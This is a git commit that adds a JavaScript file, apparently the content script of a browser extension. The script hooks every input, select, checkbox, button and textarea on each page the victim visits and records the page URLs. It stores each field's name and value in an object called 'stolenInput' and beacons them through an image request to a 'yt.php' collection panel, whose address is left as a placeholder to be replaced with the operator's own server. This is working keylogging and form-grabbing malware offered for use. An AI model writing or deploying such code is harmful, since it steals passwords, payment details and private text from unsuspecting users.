f50194bc7213cc750119a0e2c0954de63d6eba48
hakanonymos <30985149+hakanonymos@users.noreply.github.com>
2020-04-16 08:43:30 +0100

    Add files via upload

---
+++ extension/js/km.js
@@ -0,0 +1,122 @@
+
+
+
+var url ="http://127.0.0.1/panel/"; //ton site ici
+var debug = 1;
+var currLoc = "";
+spyjs_refreshEvents();
+
+function spyjs_refreshEvents(){
+	if(currLoc != location.href){
+		currLoc=location.href;
+		if(debug){
+			console.log(currLoc);
+		}
+		spyjs_saveData("("+currLoc+")");
+	}
+	$('input').unbind('change');
+	$('input').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+	
+	$('select').unbind('change');
+	$('select').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+	
+	$('checkbox').unbind('change');
+	$('checkbox').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+	
+	$('button').unbind('change');
+	$('button').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+	
+	
+	$('textarea').unbind('change');
+	$('textarea').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+}
+	
+function spyjs_getInput(inputInfo){
+	 
+	var name = inputInfo.name;
+	var value = inputInfo.value;
+	var stolenInput = {};
+	if(name === ""){
+		name="undefined_input";
+	}
+	if(value != ""){
+		stolenInput[name] = value;
+		if(debug){
+			console.log(name+"="+value);
+		}
+		
+        var pic = new Image()
+        pic.src = url+'yt.php?values='+name+"="+value 
+		
+	}
+}
+function spyjs_saveData(data){
+	
+};
+
+   
+
+	 
+	 
+	 
+	 
+	 
+	 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	 
+	 
+
+
+
